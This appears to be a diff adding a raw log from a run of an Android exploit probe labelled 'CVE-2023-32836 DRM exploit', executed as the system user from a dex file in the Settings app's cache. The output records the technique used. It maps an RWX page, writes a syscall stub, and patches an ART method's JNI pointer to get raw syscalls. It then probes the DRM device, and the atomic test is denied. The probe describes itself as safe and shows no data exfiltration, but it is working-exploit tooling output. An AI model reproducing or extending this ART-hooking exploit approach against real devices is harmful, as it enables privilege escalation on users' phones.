@@ -1,0 +1,87 @@
+command=CLASSPATH=/data/data/com.android.settings/cache/drm_trigger.dex app_process64 /system/bin DrmTrigger atomicprobe
+probe=drm-trigger
+dex_md5=01d31c61bd7600b78187ebb151556c3b
+dex_sha256=dbe0e500b964f9aca70f01490b91675c8973b40fdf915cd92f1070ead763277f
+remote_dex=/data/data/com.android.settings/cache/drm_trigger.dex
+shell_port=127.0.0.1:48888
+exit_status=0
+
+uid=1000(system) gid=1000(system) groups=1000(system),3003(inet) context=u:r:system_app:s0
+u:r:system_app:s0
+01d31c61bd7600b78187ebb151556c3b  /data/data/com.android.settings/cache/drm_trigger.dex
+[*] CVE-2023-32836 DRM exploit (Java/dalvikvm)
+[*] pid=6522 uid=1000 mode=atomicprobe
+[*] === DRM atomic entry probe (safe) ===
+
+[*] Only SET_CLIENT_CAP, resource enumeration, and empty TEST_ONLY are used.
+[+] Scratch buffer at 0x7eddc3b000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x7eddbf6000
+[+] Wrote syscall stub: JNI@+0x00 (36B), call stub JNI@+0x80 (40B); entry_point left untouched
+[*] ArtMethod for nativeSyscall at 0x7ed90b09d0
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x7c2b61a2c0
+    entry_point    = 0x1038000876906858
+[*] Patching data_ (JNI) → 0x7eddbf6000
+    data_       = 0x7eddbf6000 ✓
+    entry_point = 0x1038000876906858 (unchanged)
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[*] openat /dev/dri/card0 ret=48
+[*] SET_CLIENT_CAP UNIVERSAL_PLANES ret=0
+[*] SET_CLIENT_CAP ATOMIC ret=0
+[*] GETRESOURCES ret=0
+    fbs=0 crtcs=3 connectors=2 encoders=3 size=1x1..4096x4096
+[*] GETPLANERESOURCES(count) ret=0 count=16
+[*] GETPLANERESOURCES(ids) ret=0
+    plane[0] id=32 GETPLANE ret=0
+        crtc=66 fb=154 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[1] id=44 GETPLANE ret=0
+        crtc=66 fb=155 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[2] id=46 GETPLANE ret=0
+        crtc=66 fb=158 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[3] id=48 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[4] id=50 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[5] id=52 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[6] id=54 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[7] id=56 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[8] id=58 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[9] id=60 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[10] id=62 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[11] id=64 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x1 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[12] id=86 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x2 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[13] id=88 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x2 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[14] id=97 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x4 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+    plane[15] id=99 GETPLANE ret=0
+        crtc=0 fb=0 possible_crtcs=0x4 gamma=0 formats=20
+        GETPROPERTIES(count) ret=-2 (ENOENT) count=0
+[*] MODE_ATOMIC empty TEST_ONLY ret=-13 (EACCES)
+[*] Done
